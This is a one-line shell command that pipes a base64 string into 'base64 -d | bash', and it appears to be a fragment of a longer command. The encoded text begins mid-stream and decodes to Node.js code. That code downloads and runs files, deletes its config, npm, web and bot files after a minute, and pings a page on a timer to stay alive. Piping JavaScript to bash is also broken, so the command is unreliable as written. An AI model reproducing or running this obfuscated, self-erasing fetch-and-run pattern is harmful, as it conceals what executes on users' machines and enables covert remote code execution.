Gh9ICR7Y29uZmlnUGF0aH0gJHtucG1QYXRofSAke3dlYlBhdGh9ICR7Ym90UGF0aH1gLCAoZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSA9PiB7CiAgICAgIGlmIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoYEVycm9yIHdoaWxlIGRlbGV0aW5nIGZpbGVzOiAke2Vycm9yfWApOwogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBjb25zb2xlLmNsZWFyKCkKICAgICAgY29uc29sZS5sb2coJ0FwcCBpcyBydW5uaW5nJyk7CiAgICAgIGNvbnNvbGUubG9nKCdUaGFuayB5b3UgZm9yIHVzaW5nIHRoaXMgc2NyaXB0LCBlbmpveSEnKTsKICAgIH0pOwogIH0sIDYwMDAwKTsKfQpjbGVhbkZpbGVzKCk7CgpsZXQgaGFzTG9nZ2VkRW1wdHlNZXNzYWdlID0gZmFsc2U7CmFzeW5jIGZ1bmN0aW9uIHZpc2l0UHJvamVjdFBhZ2UoKSB7CiAgdHJ5IHsKICAgIGlmICghcHJvamVjdFBhZ2VVUkwgfHwgIWludGVydmFsSW5zZWNvbmRzKSB7CiAgICAgIGlmICghaGFzTG9nZ2VkRW1wdHlNZXNzYWdlKSB7CiAgICAgICAgY29uc29sZS5sb2coIlVSTCBvciBUSU1FIHZhcmlhYmxlIGlzIGVtcHR5LHNraXAgdmlzaXQgdXJsIik7CiAgICAgICAgaGFzTG9nZ2VkRW1wdHlNZXNzYWdlID0gdHJ1ZTsKICAgICAgfQogICAgICByZXR1cm47CiAgICB9IGVsc2UgewogICAgICBoYXNMb2dnZWRFbXB0eU1lc3NhZ2UgPSBmYWxzZTsKICAgIH0KCiAgICBhd2FpdCBheGlvcy5nZXQocHJvamVjdFBhZ2VVUkwpOwogICAgY29uc29sZS5sb2coJ1BhZ2UgdmlzaXRlZCBzdWNjZXNzZnVsbHknKTsKICAgIGNvbnNvbGUuY2xlYXIoKQogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICBjb25zb2xlLmVycm9yKCdFcnJvciB2aXNpdGluZyBwcm9qZWN0IHBhZ2U6JywgZXJyb3IubWVzc2FnZSk7CiAgfQp9CnNldEludGVydmFsKHZpc2l0UHJvamVjdFBhZ2UsIGludGVydmFsSW5zZWNvbmRzICogMTAwMCk7Cgphc3luYyBmdW5jdGlvbiBzdGFydHNlcnZlcigpIHsKICBhd2FpdCBkb3dubG9hZEZpbGVzQW5kUnVuKCk7CiAgYXdhaXQgZXh0cmFjdERvbWFpbnMoKTsKICB2aXNpdFByb2plY3RQYWdlKCk7Cn0Kc3RhcnRzZXJ2ZXIoKTsKCmFwcC5saXN0ZW4oUE9SVCwgKCkgPT4gY29uc29sZS5sb2coYEh0dHAgc2VydmVyIGlzIHJ1bm5pbmcgb24gcG9ydDoke1BPUlR9IWApKTs=" | base64 -d | bash
